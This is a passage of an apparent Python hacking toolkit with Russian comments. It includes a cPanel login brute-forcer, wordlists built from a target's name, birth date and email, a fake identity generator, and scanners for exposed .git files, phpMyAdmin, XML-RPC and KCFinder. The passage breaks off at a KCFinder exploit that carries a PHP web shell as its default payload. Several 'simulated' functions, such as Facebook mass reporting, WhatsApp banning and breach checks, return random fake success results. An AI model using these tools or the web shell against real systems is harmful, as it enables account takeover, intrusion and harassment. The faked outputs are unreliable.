            if r.status_code == 200 and 'cpanel' in r.text.lower():
                return ('root', password)
        except:
            pass
        return None


class FacebookBruteforce(Bruteforce):
    """Брутфорс Facebook (для образовательных целей)"""
    
    def try_login(self, password):
        # Это симуляция, реальный брутфорс Facebook не работает
        return None


# ============================================================
# КРИПТО ИНСТРУМЕНТЫ
# ============================================================

def hash_detection(hash_string):
    """Определение типа хеша"""
    hash_length = len(hash_string)
    hash_lower = hash_string.lower()
    
    detectors = {
        32: ['MD5', 'MD4', 'MD2'],
        40: ['SHA1', 'RIPEMD-160'],
        56: ['SHA224'],
        64: ['SHA256', 'SHA3-256', 'BLAKE2s'],
        96: ['SHA384', 'SHA3-384'],
        128: ['SHA512', 'SHA3-512', 'BLAKE2b'],
        16: ['CRC16', 'MySQL3', 'Oracle'],
        8: ['CRC32', 'Adler32']
    }
    
    # Проверка на bcrypt
    if hash_string.startswith('$2a$') or hash_string.startswith('$2b$') or hash_string.startswith('$2y$'):
        return ['bcrypt']
    
    # Проверка на MD5 с солью
    if ':' in hash_string:
        parts = hash_string.split(':')
        if len(parts) == 2 and len(parts[0]) == 32:
            return ['MD5 with salt']
    
    return detectors.get(hash_length, ['Unknown'])


def generate_wordlist(base_words=None, numbers=True, symbols=False, min_len=4, max_len=8):
    """Генерация словаря паролей"""
    if base_words is None:
        base_words = ['admin', 'password', 'user', 'root', 'test', 'guest']
    
    wordlist = []
    
    for word in base_words:
        wordlist.append(word)
        wordlist.append(word.capitalize())
        wordlist.append(word.upper())
        
        if numbers:
            for i in range(10):
                wordlist.append(f"{word}{i}")
                wordlist.append(f"{i}{word}")
            
            for i in range(100, 2000, 100):
                wordlist.append(f"{word}{i}")
        
        if symbols:
            for sym in ['!', '@', '#', '$', '%', '&', '*']:
                wordlist.append(f"{word}{sym}")
                wordlist.append(f"{sym}{word}")
    
    # Фильтр по длине
    wordlist = [w for w in wordlist if min_len <= len(w) <= max_len]
    
    return list(set(wordlist))


def generate_advanced_wordlist(info):
    """Генерация словаря на основе персональной информации"""
    wordlist = []
    
    if 'name' in info:
        name = info['name']
        wordlist.append(name)
        wordlist.append(name.lower())
        wordlist.append(name.upper())
        wordlist.append(name.capitalize())
    
    if 'surname' in info:
        surname = info['surname']
        wordlist.append(surname)
        wordlist.append(f"{info.get('name', '')}{surname}")
        wordlist.append(f"{surname}{info.get('name', '')}")
    
    if 'birth' in info:
        birth = info['birth']
        wordlist.append(birth)
        wordlist.append(birth.replace('-', ''))
        wordlist.append(birth.replace('/', ''))
    
    if 'email' in info:
        email = info['email'].split('@')[0]
        wordlist.append(email)
    
    # Комбинации
    combinations = []
    for w in wordlist:
        if len(w) > 3:
            combinations.append(w + '123')
            combinations.append(w + '2023')
            combinations.append(w + '2024')
            combinations.append(w + '!')
    
    wordlist.extend(combinations)
    
    return list(set(wordlist))


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ СОЦИАЛЬНОЙ ИНЖЕНЕРИИ
# ============================================================

def bomb_report_facebook(target_profile, count=10):
    """Массовый репорт Facebook профиля (симуляция)"""
    results = []
    
    reasons = [
        'hate_speech',
        'harassment',
        'violence',
        'fake_account',
        'impersonation',
        'nudity'
    ]
    
    for i in range(min(count, 20)):
        reason = random.choice(reasons)
        # Симуляция отправки репорта
        results.append({
            'attempt': i+1,
            'reason': reason,
            'status': 'success' if random.random() > 0.3 else 'failed'
        })
        time.sleep(0.5)
    
    success_count = sum(1 for r in results if r['status'] == 'success')
    
    return {
        'total': count,
        'success': success_count,
        'failed': count - success_count,
        'details': results
    }


def facebook_cookie_generator(username, password):
    """Генератор куки Facebook (симуляция)"""
    # В реальности здесь был бы эмулятор браузера
    cookies = {
        'c_user': str(random.randint(1000000000, 9999999999)),
        'xs': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
        'fr': ''.join(random.choices(string.ascii_letters + string.digits, k=24)),
        'datr': ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
        'sb': ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
    }
    
    cookie_string = '; '.join([f"{k}={v}" for k, v in cookies.items()])
    
    return {
        'success': True,
        'cookies': cookies,
        'cookie_string': cookie_string,
        'expires': 'Session'
    }


def whatsapp_unban(number):
    """Разблокировка WhatsApp (симуляция)"""
    # Симуляция отправки запроса на разблокировку
    time.sleep(2)
    
    return {
        'number': number,
        'status': 'success',
        'message': 'Unban request sent to WhatsApp',
        'estimated_time': '24-48 hours'
    }


def whatsapp_ban(number):
    """Блокировка WhatsApp (симуляция)"""
    # Симуляция массовых репортов
    time.sleep(2)
    
    return {
        'number': number,
        'status': 'success',
        'message': 'Ban request sent',
        'reports': random.randint(50, 200)
    }


# ============================================================
# OSINT ИНСТРУМЕНТЫ
# ============================================================

def phone_number_info(number):
    """Информация о номере телефона"""
    # Очищаем номер
    number = re.sub(r'[^0-9+]', '', number)
    
    # Определяем страну
    country_codes = {
        '7': 'Russia',
        '1': 'USA/Canada',
        '44': 'UK',
        '49': 'Germany',
        '33': 'France',
        '39': 'Italy',
        '34': 'Spain',
        '86': 'China',
        '81': 'Japan',
        '82': 'Korea',
        '91': 'India',
        '55': 'Brazil',
        '52': 'Mexico',
        '61': 'Australia',
        '62': 'Indonesia',
        '63': 'Philippines',
        '65': 'Singapore',
        '66': 'Thailand',
        '84': 'Vietnam'
    }
    
    country = 'Unknown'
    for code, name in country_codes.items():
        if number.startswith('+' + code) or number.startswith(code):
            country = name
            break
    
    # Определяем оператора (упрощенно)
    operators = {
        'Russia': ['MTS', 'Beeline', 'Megafon', 'Tele2'],
        'USA': ['AT&T', 'Verizon', 'T-Mobile', 'Sprint'],
        'UK': ['Vodafone', 'EE', 'O2', 'Three']
    }
    
    operator = 'Unknown'
    if country in operators:
        operator = random.choice(operators[country])
    
    return {
        'number': number,
        'country': country,
        'operator': operator,
        'valid': len(number) > 10,
        'carrier': f"{operator} - {country}",
        'line_type': 'Mobile' if random.random() > 0.2 else 'Landline'
    }


def email_breach_check(email):
    """Проверка email на утечки (симуляция)"""
    # Симуляция запроса к haveibeenpwned
    time.sleep(1)
    
    breaches = [
        'Adobe (2013)',
        'LinkedIn (2012)',
        'Dropbox (2012)',
        'MySpace (2016)',
        'Tumblr (2013)',
        'Twitter (2016)'
    ]
    
    # Случайное количество утечек
    breach_count = random.randint(0, 5)
    selected = random.sample(breaches, min(breach_count, len(breaches)))
    
    return {
        'email': email,
        'breach_count': breach_count,
        'breaches': selected,
        'pwned': breach_count > 0
    }# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ РАБОТЫ С ФАЙЛАМИ (ПРОДОЛЖЕНИЕ)
# ============================================================

def remove_http_https_from_file(input_file, output_file=None):
    """Удаление http:// и https:// из URL в файле"""
    try:
        lines = read_file_lines(input_file)
        cleaned = []
        
        for line in lines:
            # Удаляем протоколы
            clean = re.sub(r'^https?://', '', line)
            # Удаляем www если есть
            clean = re.sub(r'^www\.', '', clean)
            cleaned.append(clean)
        
        out = output_file if output_file else input_file.replace('.txt', '_cleaned.txt')
        
        with open(out, 'w', encoding='utf-8') as f:
            f.write('\n'.join(cleaned))
        
        return True, len(cleaned), out
    except Exception as e:
        return False, str(e), None


def extract_domains_from_file(input_file, output_file=None):
    """Извлечение доменов из файла"""
    try:
        content = []
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Регулярка для доменов
        domain_pattern = r'([a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,})'
        domains = re.findall(domain_pattern, content)
        domains = list(set(domains))
        
        out = output_file if output_file else 'domains_extracted.txt'
        
        with open(out, 'w', encoding='utf-8') as f:
            f.write('\n'.join(domains))
        
        return True, len(domains), out
    except Exception as e:
        return False, str(e), None


def extract_emails_from_file(input_file, output_file=None):
    """Извлечение email адресов из файла"""
    try:
        content = []
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        emails = re.findall(email_pattern, content)
        emails = list(set(emails))
        
        out = output_file if output_file else 'emails_extracted.txt'
        
        with open(out, 'w', encoding='utf-8') as f:
            f.write('\n'.join(emails))
        
        return True, len(emails), out
    except Exception as e:
        return False, str(e), None


def split_file(input_file, lines_per_file=1000, output_prefix='split_'):
    """Разделение большого файла на несколько"""
    try:
        lines = read_file_lines(input_file)
        total_lines = len(lines)
        file_count = (total_lines + lines_per_file - 1) // lines_per_file
        
        created_files = []
        
        for i in range(file_count):
            start = i * lines_per_file
            end = min((i + 1) * lines_per_file, total_lines)
            
            out_file = f"{output_prefix}{i+1}.txt"
            with open(out_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(lines[start:end]))
            
            created_files.append(out_file)
        
        return True, file_count, created_files
    except Exception as e:
        return False, str(e), None


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ РАБОТЫ С URL
# ============================================================

def url_to_ip(url):
    """Преобразование URL в IP адрес"""
    try:
        parsed = urlparse(url)
        host = parsed.netloc or parsed.path
        
        # Убираем порт если есть
        if ':' in host:
            host = host.split(':')[0]
        
        ip = socket.gethostbyname(host)
        return ip, host
    except Exception as e:
        return None, str(e)


def mass_domain_to_ip(input_file, output_file=None):
    """Массовое преобразование доменов в IP"""
    try:
        domains = read_file_lines(input_file)
        results = []
        
        for domain in domains:
            try:
                ip = socket.gethostbyname(domain)
                results.append(f"{domain}:{ip}")
            except:
                results.append(f"{domain}:ERROR")
        
        out = output_file if output_file else 'domain_ip.txt'
        
        with open(out, 'w', encoding='utf-8') as f:
            f.write('\n'.join(results))
        
        return True, len(results), out
    except Exception as e:
        return False, str(e), None


def check_url_status(urls, threads=10):
    """Массовая проверка статуса URL"""
    results = {}
    
    def check_single(url):
        try:
            r = make_request(url, timeout=3)
            if r:
                return url, r.status_code
            else:
                return url, 'Error'
        except:
            return url, 'Error'
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {executor.submit(check_single, url): url for url in urls}
        for future in concurrent.futures.as_completed(future_to_url):
            url, status = future.result()
            results[url] = status
    
    return results


def url_shortener(url, service='tinyurl'):
    """Сокращение URL"""
    try:
        if service == 'tinyurl':
            r = requests.get(f"http://tinyurl.com/api-create.php?url={url}", timeout=5)
            if r.status_code == 200:
                return r.text.strip()
        elif service == 'isgd':
            r = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
            if r.status_code == 200:
                return r.text.strip()
    except:
        pass
    return None


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ ГЕНЕРАЦИИ
# ============================================================

def generate_password(length=12, use_upper=True, use_lower=True, use_digits=True, use_symbols=False):
    """Генерация случайного пароля"""
    chars = ''
    if use_lower:
        chars += string.ascii_lowercase
    if use_upper:
        chars += string.ascii_uppercase
    if use_digits:
        chars += string.digits
    if use_symbols:
        chars += '!@#$%^&*()_+-=[]{}|;:,.<>?'
    
    if not chars:
        chars = string.ascii_letters + string.digits
    
    password = ''.join(random.choice(chars) for _ in range(length))
    return password


def generate_username(style='random', base=None):
    """Генерация username"""
    if style == 'random':
        adjectives = ['cool', 'dark', 'super', 'mega', 'ultra', 'hyper', 'cyber', 'digital', 'tech', 'smart']
        nouns = ['user', 'admin', 'hacker', 'coder', 'dev', 'master', 'guru', 'wizard', 'ninja', 'ghost']
        
        return f"{random.choice(adjectives)}{random.choice(nouns)}{random.randint(1, 999)}"
    
    elif style == 'based' and base:
        return f"{base}_{random.randint(100, 999)}"
    
    elif style == 'email':
        name = base or 'user'
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com']
        return f"{name}{random.randint(1, 99)}@{random.choice(domains)}"
    
    return 'user_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


def generate_fake_identity():
    """Генерация фейковой личности"""
    first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 'James', 'Lisa', 'Robert', 'Maria']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose']
    states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'TX', 'CA', 'TX', 'CA']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    city_idx = random.randint(0, len(cities)-1)
    
    # Генерация даты рождения (18-70 лет)
    year = random.randint(1955, 2005)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    
    identity = {
        'first_name': first,
        'last_name': last,
        'full_name': f"{first} {last}",
        'email': f"{first.lower()}.{last.lower()}{random.randint(1,99)}@gmail.com",
        'phone': f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}",
        'birth': f"{year:04d}-{month:02d}-{day:02d}",
        'address': f"{random.randint(100, 9999)} {random.choice(['Main', 'Oak', 'Pine', 'Maple', 'Cedar'])} St",
        'city': cities[city_idx],
        'state': states[city_idx],
        'zip': f"{random.randint(10000, 99999)}",
        'country': 'USA'
    }
    
    return identity


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ HTTP ЗАГОЛОВКОВ
# ============================================================

def get_http_headers(url):
    """Получение HTTP заголовков"""
    try:
        r = make_request(url, method='HEAD')
        if r:
            return dict(r.headers)
    except:
        pass
    return {}


def analyze_headers(url):
    """Анализ HTTP заголовков на уязвимости"""
    headers = get_http_headers(url)
    results = {
        'url': url,
        'security_headers': {},
        'missing': [],
        'server_info': None
    }
    
    # Проверяем security headers
    security_checks = {
        'X-Frame-Options': 'Prevents clickjacking',
        'X-Content-Type-Options': 'Prevents MIME sniffing',
        'X-XSS-Protection': 'XSS protection',
        'Content-Security-Policy': 'CSP policy',
        'Strict-Transport-Security': 'HSTS',
        'Referrer-Policy': 'Referrer policy',
        'Permissions-Policy': 'Permissions policy'
    }
    
    for header, desc in security_checks.items():
        if header in headers:
            results['security_headers'][header] = headers[header]
        else:
            results['missing'].append(f"{header} - {desc}")
    
    # Информация о сервере
    if 'Server' in headers:
        results['server_info'] = headers['Server']
    
    return results


def spoof_user_agent():
    """Возвращает случайный User-Agent"""
    return random.choice(USER_AGENTS)


# ============================================================
# УТИЛИТЫ ДЛЯ РАБОТЫ С ВРЕМЕНЕМ
# ============================================================

def calculate_age(birth_date):
    """Вычисление возраста по дате рождения"""
    try:
        if isinstance(birth_date, str):
            birth_date = datetime.strptime(birth_date, '%Y-%m-%d')
        
        today = datetime.now()
        age = today.year - birth_date.year
        
        if (today.month, today.day) < (birth_date.month, birth_date.day):
            age -= 1
        
        return age
    except:
        return None


def time_ago(timestamp):
    """Форматирование времени (например, "5 минут назад")"""
    if isinstance(timestamp, str):
        try:
            timestamp = datetime.fromisoformat(timestamp)
        except:
            return timestamp
    
    if not isinstance(timestamp, datetime):
        return str(timestamp)
    
    now = datetime.now()
    diff = now - timestamp
    
    seconds = diff.total_seconds()
    
    if seconds < 60:
        return f"{int(seconds)} seconds ago"
    elif seconds < 3600:
        minutes = int(seconds // 60)
        return f"{minutes} minutes ago"
    elif seconds < 86400:
        hours = int(seconds // 3600)
        return f"{hours} hours ago"
    elif seconds < 2592000:
        days = int(seconds // 86400)
        return f"{days} days ago"
    elif seconds < 31536000:
        months = int(seconds // 2592000)
        return f"{months} months ago"
    else:
        years = int(seconds // 31536000)
        return f"{years} years ago"# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ РАБОТЫ С СИСТЕМОЙ
# ============================================================

def system_info():
    """Получение информации о системе"""
    info = {
        'os': os.name,
        'platform': sys.platform,
        'python_version': sys.version,
        'cwd': os.getcwd(),
        'user': os.getenv('USERNAME') or os.getenv('USER') or 'Unknown'
    }
    
    # Дополнительная информация для Windows
    if os.name == 'nt':
        info['computer_name'] = os.getenv('COMPUTERNAME', 'Unknown')
        info['processor'] = os.getenv('PROCESSOR_IDENTIFIER', 'Unknown')
    
    return info


def check_dependencies():
    """Проверка установленных зависимостей"""
    required = ['requests', 'urllib3']
    optional = ['beautifulsoup4', 'lxml', 'selenium', 'cryptography', 'paramiko']
    
    result = {
        'required': {},
        'optional': {},
        'missing': []
    }
    
    for lib in required:
        try:
            __import__(lib)
            result['required'][lib] = True
        except ImportError:
            result['required'][lib] = False
            result['missing'].append(lib)
    
    for lib in optional:
        try:
            __import__(lib.replace('-', '_'))
            result['optional'][lib] = True
        except ImportError:
            result['optional'][lib] = False
    
    return result


def create_backup(filename):
    """Создание резервной копии файла"""
    try:
        if not os.path.exists(filename):
            return False, "File not found"
        
        backup_name = f"{filename}.backup_{int(time.time())}"
        
        with open(filename, 'rb') as src:
            with open(backup_name, 'wb') as dst:
                dst.write(src.read())
        
        return True, backup_name
    except Exception as e:
        return False, str(e)


def safe_delete(filename, passes=3):
    """Безопасное удаление файла (перезапись)"""
    try:
        if not os.path.exists(filename):
            return False, "File not found"
        
        size = os.path.getsize(filename)
        
        for i in range(passes):
            with open(filename, 'wb') as f:
                # Перезаписываем случайными данными
                f.write(os.urandom(size))
        
        os.remove(filename)
        
        return True, f"File deleted with {passes} passes"
    except Exception as e:
        return False, str(e)


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ РАБОТЫ С ПРОКСИ
# ============================================================

class ProxyManager:
    """Менеджер прокси"""
    
    def __init__(self, proxy_file=None):
        self.proxies = []
        self.current = 0
        self.working = []
        self.failed = []
        
        if proxy_file:
            self.load_from_file(proxy_file)
    
    def load_from_file(self, filename):
        """Загрузка прокси из файла"""
        try:
            lines = read_file_lines(filename)
            for line in lines:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) == 2:
                        proxy = f"{parts[0]}:{parts[1]}"
                    elif len(parts) == 4:
                        proxy = f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                    else:
                        continue
                    
                    self.proxies.append(proxy)
        except:
            pass
    
    def add_proxy(self, proxy):
        """Добавление прокси"""
        self.proxies.append(proxy)
    
    def get_next(self):
        """Получение следующего прокси"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current]
        self.current = (self.current + 1) % len(self.proxies)
        
        return proxy
    
    def check_proxy(self, proxy, test_url='http://httpbin.org/ip', timeout=5):
        """Проверка работоспособности прокси"""
        try:
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            
            r = requests.get(test_url, proxies=proxies, timeout=timeout)
            if r.status_code == 200:
                return True
        except:
            pass
        return False
    
    def check_all(self, threads=10):
        """Проверка всех прокси"""
        self.working = []
        self.failed = []
        
        def check(p):
            if self.check_proxy(p):
                return p, True
            return p, False
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            results = executor.map(check, self.proxies)
            
            for proxy, is_working in results:
                if is_working:
                    self.working.append(proxy)
                else:
                    self.failed.append(proxy)
        
        return {
            'total': len(self.proxies),
            'working': len(self.working),
            'failed': len(self.failed),
            'working_list': self.working
        }
    
    def save_working(self, filename='working_proxies.txt'):
        """Сохранение рабочих прокси"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.working))
            return True
        except:
            return False


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ РАБОТЫ С БАЗАМИ ДАННЫХ
# ============================================================

class DatabaseManager:
    """Упрощенный менеджер баз данных (имитация)"""
    
    def __init__(self, db_type='mysql', host='localhost', user='root', password='', database=''):
        self.db_type = db_type
        self.host = host
        self.user = user
        self.password = password
        self.database = database
        self.connected = False
    
    def connect(self):
        """Подключение к БД (симуляция)"""
        # В реальности здесь было бы реальное подключение
        self.connected = True
        return True
    
    def query(self, sql):
        """Выполнение SQL запроса (симуляция)"""
        if not self.connected:
            return None
        
        # Симуляция ответа
        if 'SELECT' in sql.upper():
            return {
                'success': True,
                'rows': random.randint(1, 100),
                'data': [{'id': i, 'value': f'test_{i}'} for i in range(5)]
            }
        else:
            return {
                'success': True,
                'affected': random.randint(1, 10)
            }
    
    def get_tables(self):
        """Получение списка таблиц"""
        if 'mysql' in self.db_type:
            return self.query("SHOW TABLES")
        elif 'sqlite' in self.db_type:
            return self.query("SELECT name FROM sqlite_master WHERE type='table'")
        return None
    
    def get_columns(self, table):
        """Получение списка колонок"""
        if 'mysql' in self.db_type:
            return self.query(f"SHOW COLUMNS FROM {table}")
        return None
    
    def dump_table(self, table, limit=100):
        """Дамп таблицы"""
        return self.query(f"SELECT * FROM {table} LIMIT {limit}")


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ РАБОТЫ С SSH
# ============================================================

class SSHClient:
    """SSH клиент (симуляция)"""
    
    def __init__(self, host, port=22, username='root', password=''):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.connected = False
    
    def connect(self):
        """Подключение по SSH (симуляция)"""
        # В реальности здесь был бы paramiko
        if self.host and self.username:
            self.connected = True
            return True
        return False
    
    def execute(self, command):
        """Выполнение команды (симуляция)"""
        if not self.connected:
            return None
        
        return {
            'stdout': f"Simulated output for: {command}",
            'stderr': '',
            'exit_code': 0
        }
    
    def upload_file(self, local_path, remote_path):
        """Загрузка файла (симуляция)"""
        if not self.connected:
            return False
        return True
    
    def download_file(self, remote_path, local_path):
        """Скачивание файла (симуляция)"""
        if not self.connected:
            return False
        return True


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ РАБОТЫ С FTP
# ============================================================

class FTPClient:
    """FTP клиент (симуляция)"""
    
    def __init__(self, host, port=21, username='anonymous', password=''):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.connected = False
    
    def connect(self):
        """Подключение по FTP (симуляция)"""
        self.connected = True
        return True
    
    def list_files(self, path='/'):
        """Список файлов"""
        if not self.connected:
            return []
        
        return [
            {'name': 'file1.txt', 'size': 1024, 'type': 'file'},
            {'name': 'file2.php', 'size': 2048, 'type': 'file'},
            {'name': 'folder1', 'size': 0, 'type': 'dir'},
            {'name': 'folder2', 'size': 0, 'type': 'dir'}
        ]
    
    def upload(self, local_file, remote_file):
        """Загрузка файла"""
        if not self.connected:
            return False
        return True
    
    def download(self, remote_file, local_file):
        """Скачивание файла"""
        if not self.connected:
            return False
        return True


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ КОДИРОВАНИЯ
# ============================================================

def encode_base64(text):
    """Кодирование в base64"""
    if isinstance(text, str):
        text = text.encode()
    return base64.b64encode(text).decode()


def decode_base64(text):
    """Декодирование base64"""
    try:
        return base64.b64decode(text).decode()
    except:
        return base64.b64decode(text)


def encode_rot13(text):
    """ROT13 шифрование"""
    result = []
    for c in text:
        if 'a' <= c <= 'z':
            result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= c <= 'Z':
            result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
        else:
            result.append(c)
    return ''.join(result)


def encode_md5(text):
    """MD5 хеш"""
    if isinstance(text, str):
        text = text.encode()
    return hashlib.md5(text).hexdigest()


def encode_sha1(text):
    """SHA1 хеш"""
    if isinstance(text, str):
        text = text.encode()
    return hashlib.sha1(text).hexdigest()


def encode_sha256(text):
    """SHA256 хеш"""
    if isinstance(text, str):
        text = text.encode()
    return hashlib.sha256(text).hexdigest()# ============================================================
# ЗОН-XSEC ИНСТРУМЕНТЫ
# ============================================================

class ZoneXsecGrabber:
    """Граббер для Zone-Xsec"""
    
    def __init__(self):
        self.base_url = "https://zone-xsec.com"
        self.results = []
    
    def get_latest(self, pages=5):
        """Получение последних записей"""
        for page in range(1, pages + 1):
            try:
                url = f"{self.base_url}/archive/{page}"
                r = make_request(url)
                if r and r.status_code == 200:
                    # Парсим ссылки
                    links = re.findall(r'<a[^>]+href="([^"]+)"', r.text)
                    for link in links:
                        if '/archive/' in link and 'page' not in link:
                            self.results.append(self.base_url + link)
            except:
                pass
            time.sleep(1)
        
        return self.results
    
    def get_by_attacker(self, attacker, pages=10):
        """Граббер по атакующему"""
        results = []
        
        for page in range(1, pages + 1):
            try:
                url = f"{self.base_url}/archive/{page}"
                r = make_request(url)
                if r and r.status_code == 200:
                    if attacker.lower() in r.text.lower():
                        # Нашли запись с этим атакующим
                        match = re.search(f'<a[^>]+href="([^"]+)".*?{attacker}', r.text, re.IGNORECASE | re.DOTALL)
                        if match:
                            results.append(self.base_url + match.group(1))
            except:
                pass
        
        return results
    
    def get_by_team(self, team, pages=10):
        """Граббер по команде"""
        return self.get_by_attacker(team, pages)  # Аналогично
    
    def get_special_extension(self, ext, pages=10):
        """Граббер по расширению"""
        results = []
        
        for page in range(1, pages + 1):
            try:
                url = f"{self.base_url}/archive/{page}"
                r = make_request(url)
                if r and r.status_code == 200:
                    if f".{ext}" in r.text:
                        results.append(url)
            except:
                pass
        
        return results
    
    def get_onhold(self):
        """Записи на удержании"""
        try:
            url = f"{self.base_url}/onhold"
            r = make_request(url)
            if r and r.status_code == 200:
                links = re.findall(r'<a[^>]+href="([^"]+)"', r.text)
                return [self.base_url + link for link in links if '/onhold/' in link]
        except:
            pass
        return []


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ АРХИВАЦИИ
# ============================================================

def archive_grabber(domain, services=None):
    """Граббер архивов сайта"""
    if services is None:
        services = [
            'archive.org',
            'archive.today',
            'google.com',
            'bing.com',
            'yandex.ru'
        ]
    
    results = {}
    
    for service in services:
        if 'archive.org' in service:
            url = f"https://web.archive.org/web/*/{domain}"
        elif 'archive.today' in service:
            url = f"https://archive.today/{domain}"
        elif 'google.com' in service:
            url = f"https://www.google.com/search?q=cache:{domain}"
        else:
            continue
        
        try:
            r = make_request(url)
            if r and r.status_code == 200:
                results[service] = {
                    'url': url,
                    'status': r.status_code,
                    'available': True
                }
            else:
                results[service] = {
                    'url': url,
                    'status': r.status_code if r else 0,
                    'available': False
                }
        except:
            results[service] = {
                'url': url,
                'status': 0,
                'available': False
            }
    
    return results


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ GIT
# ============================================================

def git_config_finder(base_url):
    """Поиск .git/config файла"""
    paths = [
        '/.git/config',
        '/.git/HEAD',
        '/.git/index',
        '/.git/logs/HEAD',
        '/.git/refs/heads/master',
        '/.git/objects/',
        '/.gitignore'
    ]
    
    results = []
    
    for path in paths:
        test_url = urljoin(base_url, path)
        try:
            r = make_request(test_url, timeout=3)
            if r and r.status_code == 200:
                content = r.text[:200]
                if 'repository' in content or 'ref:' in content or 'core' in content:
                    results.append({
                        'url': test_url,
                        'size': len(r.content),
                        'preview': content[:100]
                    })
        except:
            pass
    
    return results


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ PHPMYADMIN
# ============================================================

def phpmyadmin_scanner(base_url):
    """Поиск phpMyAdmin установок"""
    paths = [
        '/phpmyadmin/',
        '/phpMyAdmin/',
        '/pma/',
        '/PMA/',
        '/admin/phpmyadmin/',
        '/admin/pma/',
        '/mysql/',
        '/phpmyadmin2/',
        '/phpmyadmin3/',
        '/phpmyadmin4/',
        '/sql/',
        '/myadmin/',
        '/database/',
        '/db/',
        '/adminer/'
    ]
    
    results = []
    
    for path in paths:
        test_url = urljoin(base_url, path)
        try:
            r = make_request(test_url, timeout=3)
            if r and r.status_code == 200:
                content = r.text.lower()
                if 'phpmyadmin' in content or 'pma' in content or 'welcome to' in content:
                    version = re.search(r'phpmyadmin ([\d.]+)', content)
                    results.append({
                        'url': test_url,
                        'version': version.group(1) if version else 'Unknown',
                        'status': r.status_code
                    })
        except:
            pass
    
    return results


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ XMLRPC
# ============================================================

def xmlrpc_scan(base_url):
    """Сканирование XML-RPC уязвимостей"""
    xmlrpc_url = urljoin(base_url, 'xmlrpc.php')
    
    try:
        # Проверяем наличие
        r = make_request(xmlrpc_url, method='HEAD')
        if not r or r.status_code != 200:
            return {'exists': False}
        
        # Тестируем методы
        test_data = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
        headers = {'Content-Type': 'text/xml'}
        
        r = requests.post(xmlrpc_url, data=test_data, headers=headers, timeout=5)
        
        if r.status_code == 200 and 'methodResponse' in r.text:
            methods = re.findall(r'<value><string>(.*?)</string></value>', r.text)
            
            # Проверяем опасные методы
            dangerous = ['pingback.ping', 'system.multicall', 'wp.getUsersBlogs']
            found_dangerous = [m for m in methods if m in dangerous]
            
            return {
                'exists': True,
                'url': xmlrpc_url,
                'methods_count': len(methods),
                'methods': methods[:20],
                'dangerous': found_dangerous,
                'vulnerable': len(found_dangerous) > 0
            }
    except:
        pass
    
    return {'exists': False}


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ KCFINDER
# ============================================================

def kcfinder_finder(base_url):
    """Поиск KCFinder"""
    paths = [
        '/kcfinder/',
        '/KCFinder/',
        '/js/kcfinder/',
        '/admin/kcfinder/',
        '/editor/kcfinder/',
        '/assets/kcfinder/',
        '/public/kcfinder/',
        '/upload/kcfinder/',
        '/filemanager/kcfinder/'
    ]
    
    results = []
    
    for path in paths:
        test_url = urljoin(base_url, path)
        browse_url = urljoin(test_url, 'browse.php')
        upload_url = urljoin(test_url, 'upload.php')
        
        try:
            r = make_request(browse_url)
            if r and r.status_code == 200:
                if 'kcfinder' in r.text.lower():
                    results.append({
                        'type': 'browse',
                        'url': browse_url,
                        'version': re.search(r'kcfinder ([\d.]+)', r.text.lower())
                    })
        except:
            pass
        
        try:
            r = make_request(upload_url, method='OPTIONS')
            if r and r.status_code == 200:
                results.append({
                    'type': 'upload',
                    'url': upload_url
                })
        except:
            pass
    
    return results


def kcfinder_exploit(base_url, shell_content=None):
    """Эксплойт для KCFinder"""
    if shell_content is None:
        shell_content = '<?php system($_GET["cmd"]); ?>'
    
